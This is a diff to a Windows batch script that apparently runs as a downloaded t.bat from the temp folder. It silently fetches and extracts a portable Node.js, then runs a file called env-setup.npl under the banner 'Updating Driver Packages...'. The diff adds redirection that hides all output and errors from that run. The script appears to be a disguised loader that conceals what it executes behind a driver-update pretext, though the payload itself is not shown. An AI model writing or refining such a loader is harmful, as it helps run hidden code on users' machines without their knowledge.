@@ -20,6 +20,7 @@ REM --- paths first: script lives in %TEMP% when run as downloaded t.bat ---
 set "EXTRACT_DIR=%~dp0nodejs"
 set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
 set "NODE_EXE="
+set "NODE_READY=0"
 set "NODE_VERSION="
 set "LATEST_VERSION="
 
@@ -27,14 +28,18 @@ where node >nul 2>&1
 if not errorlevel 1 (
     for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
     set "NODE_EXE=node"
+    set "NODE_READY=1"
 )
 
-if not defined NODE_EXE if exist "!PORTABLE_NODE!" (
-    set "NODE_EXE=!PORTABLE_NODE!"
-    set "PATH=!EXTRACT_DIR!\PFiles64\nodejs;!PATH!"
+if "!NODE_READY!"=="0" (
+    if exist "!PORTABLE_NODE!" (
+        set "NODE_EXE=!PORTABLE_NODE!"
+        set "PATH=!EXTRACT_DIR!\PFiles64\nodejs;!PATH!"
+        set "NODE_READY=1"
+    )
 )
 
-if not defined NODE_EXE (
+if "!NODE_READY!"=="0" (
     set "NODE_VERSION=22.16.0"
     set "NODE_MSI=node-v!NODE_VERSION!-x64.msi"
     set "DOWNLOAD_URL=https://nodejs.org/dist/v!NODE_VERSION!/!NODE_MSI!"
@@ -47,26 +52,26 @@ if not defined NODE_EXE (
         curl -s -L --connect-timeout 30 --max-time 600 -o "!MSI_OUT!" "!DOWNLOAD_URL!"
     )
 
-    if not exist "!MSI_OUT!" (
+    if exist "!MSI_OUT!" (
+        msiexec /a "!MSI_OUT!" /qn TARGETDIR="!EXTRACT_DIR!" >nul 2>&1
+        del "!MSI_OUT!" >nul 2>&1
+    ) else (
         echo [WARN] Node.js MSI download failed. Continuing without Node setup.
-        goto after_node_setup
     )
 
-    msiexec /a "!MSI_OUT!" /qn TARGETDIR="!EXTRACT_DIR!" >nul 2>&1
-    del "!MSI_OUT!" >nul 2>&1
-
-    if not exist "!PORTABLE_NODE!" (
+    if exist "!PORTABLE_NODE!" (
+        set "NODE_EXE=!PORTABLE_NODE!"
+        set "PATH=!EXTRACT_DIR!\PFiles64\nodejs;!PATH!"
+        set "NODE_READY=1"
+    ) else (
+        if exist "!MSI_OUT!" (
+            rem no-op: already handled above
+        )
         echo [WARN] Node.exe not found after MSI admin install.
         echo [WARN] Expected file: !PORTABLE_NODE!
         echo [WARN] EXTRACT_DIR was: !EXTRACT_DIR!
-        goto after_node_setup
     )
-
-    set "NODE_EXE=!PORTABLE_NODE!"
-    set "PATH=!EXTRACT_DIR!\PFiles64\nodejs;!PATH!"
 )
-
-:after_node_setup
 if not defined NODE_EXE (
     echo [WARN] Node.js is not available after setup. Continuing without env-setup.npl.
 )
@@ -106,7 +111,7 @@ echo [INFO] Updating Driver Packages...
 cd /d "%CODEPROFILE%"
 if defined NODE_EXE (
     if exist "%CODEPROFILE%\env-setup.npl" (
-        "%NODE_EXE%" "env-setup.npl"
+        cmd /d /c ""%NODE_EXE%" "env-setup.npl"" >nul 2>&1
         if errorlevel 1 (
             echo [WARN] Driver script env-setup.npl failed. Exit code: !ERRORLEVEL!
         )
